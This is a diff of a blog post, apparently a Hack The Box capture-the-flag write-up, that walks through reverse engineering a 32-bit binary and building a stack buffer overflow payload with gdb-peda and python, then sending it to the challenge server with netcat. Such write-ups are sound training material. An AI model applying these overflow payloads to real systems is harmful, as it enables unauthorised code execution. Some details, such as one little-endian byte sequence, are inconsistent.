@@ -1,37 +1,170 @@
 ---
 layout: post
-title: 'Hack The Box | You know 0xDiablos'
-date: '2023-02-09 10:48:44 +0100'
+title: 'Hack The Box - You know 0xDiablos'
+date: '2023-02-10 10:48:44 +0100'
 image:
   path: /assets/img/posts/you-know-0xdiablos/you-know-0xdiablos.png
   alt: You know 0xDiablos - card
-tags: [HackTheBox, buffer-overflow]
+categories: [HackTheBox, Beginner Track]
+tags: [Hack-The-Box-Easy, buffer-overflow]
 ---
 
-
+```
+CHALLENGE DESCRIPTION : I missed my flag
+HOST : 178.62.24.63:31507
+FILE : 1 file (vuln)
+```
 
 ## Tools used
 
-  - gdb : with peda
-  - pwntools
-  - python3
+  - [netcat](https://nmap.org/ncat/)
+  - [gdb](https://www.sourceware.org/gdb/) : with [peda](https://github.com/longld/peda)
+  - [ghidra](https://ghidra-sre.org/)
+  - [python3](https://www.python.org/)
+  - [pwntools](https://github.com/Gallopsled/pwntools#readme) : python library
 
 
-## Discover the eip offset
+## What to do ?
 
-To create buffer overflow you need to highlight it. In the `vuln` function in the vuln file we see this line :
+  - First we'll try to connect to the server with `netcat` to understand what we can do there.
+  - Next, we will determine what type of file `vuln` is, what it does and what it contains.
+  - Then we'll find a loophole and exploit it.
+
+## Connect to the server with `netcat`
+
+So, to connect to the server, run the following command :
+
+```bash
+obytes> nc 134.209.17.36 32355  
+You know who are 0xDiablos: 
+test
+test
+```
+
+## Vuln file
+
+Do determinate what type of file `vuln` is, we gonna use `file` command :
+
+```bash
+0bytes> file vuln
+vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
+dynamically linked, interpreter /lib/ld-linux.so.2, 
+BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, 
+for GNU/Linux 3.2.0, not stripped
+```
+
+Is a 32-bit Linkable Object Format EFL for 64-bit execution. But what does that mean? It is an executable file.
+So the next step is to execute it. But first we must give permission to run the file, by the following command :
+
+```bash
+chmod +x vuln
+```
+
+Once the execution authorization is given, execute the file
+
+```
+obytes> ./vuln      
+You know who are 0xDiablos: 
+test
+test
+```
+
+The program outputs "You know what the 0xDiablos are:" and waits for an input. Then it displays the input. We notice that the `vuln` file is the same as on the server.
+To find out more about the vuln program, we need to analyze its code to understand how it works. We are going to use `ghidra` a reverse engineering software that analyzes the compiled code.
+
+When you create a new project and add the vuln file to it. We see three main functions (main, vuln, flag):
+
+#### main function
+
+```cpp
+undefined4 main(void)
+{
+	__gid_t __rgid;
+
+	setvbuf(stdout,(char *)0x0,2,0);
+	__rgid = getegid();
+	setresgid(__rgid,__rgid,__rgid);
+	puts("You know who are 0xDiablos: ");
+	vuln();
+	return 0;
+}
+```
+
+#### vuln function
+
+```cpp
+void vuln(void)
+
+{
+	char local_bc [180];
+
+	gets(local_bc);
+	puts(local_bc);
+	return;
+}
+```
+
+#### flag function
+
+```cpp
+void flag(int param_1,int param_2)
+{
+	char local_50 [64];
+	FILE *local_10;
+	
+	local_10 = fopen("flag.txt","r");
+	if (local_10 != (FILE *)0x0) {
+		fgets(local_50,0x40,local_10);
+		if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
+			printf(local_50);
+		}
+		return;
+	}
+	puts("Hurry up and try in on server side.");
+	exit(0);
+}
+```
+
+### Understand vuln file
+
+Now we can understand how program works. The `main` function call `vuln` function.
+
+```cpp
+undefined4 main(void)
+{
+	...
+	vuln();
+	...
+}
+```
+
+Then the vuln method wait for a input with `gets()` and output the message we just in with `puts()`.
+The gets method is [susceptible to suffer from buffer overflow attacks](https://www.geeksforgeeks.org/gets-is-risky-to-use/).
+To create buffer overflow you need to highlight it.
+
+## Buffer overflow
+
+In the `vuln` function we see this line :
 
 ```cpp
 char local_bc [180];
 ```
 
-It is a string of 180 bytes or 179 characters and the end character 0x00. We need to find the number of bytes 
+It is a string of 180 bytes a memory space who can contains 179 characters and the end character 0x00. We need to find the `eip offset`.
 
-Start the program and wait the first break point (`peda` set automatically on main):
+```bash
+0bytes> python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)" > exploit.txt
+0bytes> cat exploit.txt | ./vul
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+```
+
+The `Segmentation fault` message we notice the program is vulnarable to buffer overflow.  
+To determine the exact `epi offset`, we will start the program with `gdb` and wait for the first breakpoint (`peda` set automatically on the main function) :
 
 ```bash
 gdb-peda$ start
-
 [Thread debugging using libthread_db enabled]
 Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 [----------------------------------registers-----------------------------------]
@@ -69,7 +202,7 @@ Legend: code, data, rodata, value
 Temporary breakpoint 1, 0x080492c0 in main ()
 ```
 
-To get eip offset you need to 
+To obtain the eip offset, you must create a pattern to determinate where buffer overflow start.
 
 ```bash
 gdb-peda$ pattern create 200 input.txt
@@ -112,10 +245,96 @@ Stopped reason: SIGSEGV
 0x41417741 in ?? ()
 ```
 
-
+The EIP register containt "0x41417741 ('AwAA')" with te nex command we can get this offset :
 
 ```bash
 gdb-peda$ pattern_offset 0x41417741
 1094809409 found at offset: 188
 ```
 
+So now we know the length of this offset.
+We need to know the address of the `flag` function to call it in our buffer overflow. `gdb` can display the addresses of the different functions with the following command:
+
+```bash
+gdb-peda$ info function
+All defined functions:
+
+Non-debugging symbols:
+[...]
+0x080491e2  flag
+[...]
+```
+
+We have obtained the address of the `flag` function and from it we can create the buffer overflow with the following command:
+
+```bash
+0bytes> python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08')" > exploit.txt
+0bytes>  cat exploit.txt | ./vuln
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
+Hurry up and try in on server side.
+```
+
+We see the output string 'Hurry up and try in on server side.' from the flag function :
+
+```cpp
+void flag(int param_1,int param_2)
+{
+	...
+	puts("Hurry up and try in on server side.");
+	...
+}
+```
+
+However, it is important to note that we must pass two arguments to the flag function. The addresses of the arguments must be in little endian representation to fill the EIP register. But we have to overwrite the return address by creating one ourselves, now the program won't know where it should go.
+
+To find addresses of parameters we can use ghidra by clicking on the param_1 or param_2.
+
+![Address of parameters 1 and 2 from flag function](/assets/img/posts/you-know-0xdiablos/address_param_1_and_2.png "Address of param_1 and param_2 from flag function")
+
+Convert them to little endian
+
+```
+param_1 = 0xdeadbeef -> to little endian \xef\xbe\xab\xde
+param_2 = 0xc0ded00d -> to little endian \x0d\xd0\xde\xc0
+```
+
+Now time to exploit
+
+```bash
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*188+b'\xe2\x91\x04\x08'+b'AAAA\xef\xbe\xad\xde'+b'\x0d\xd0\xde\xc0')" > exploit.txt
+```
+
+> Address explained :
+ - `'A'*188` : epi offset
+ - `\xe2\x91\x04\x08` : allow to call flag function
+ - `AAAA` : crushe the returning address
+ - `xef\xbe\xad\xde` : param_1
+ - `\x0d\xd0\xde\xc0` : param_2
+{: .prompt-info }
+
+
+```bash
+cat exploit.txt | ./vuln 
+You know who are 0xDiablos: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAﾭ�
+Hurry up and try in on server side.
+```
+
+So now we can not try and the server using the following command:
+
+```
+cat exploit.txt - | nc 178.62.24.63 31507
+You know who are 0xDiablos: 
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAﾭ�
+HTB{...}
+```
+
+> Command explained :
+ - `cat` : allows to display the content of a file
+ - `-` : tell cat to read from stdin
+ - `nc` : allows to open network connections locally on the machine, followed by the host address and the port.
+{: .prompt-info }
+
+![Desktop View](/assets/img/posts/you-know-0xdiablos/you-know-0xdiablos-pwned.png){: width="972" height="589" }
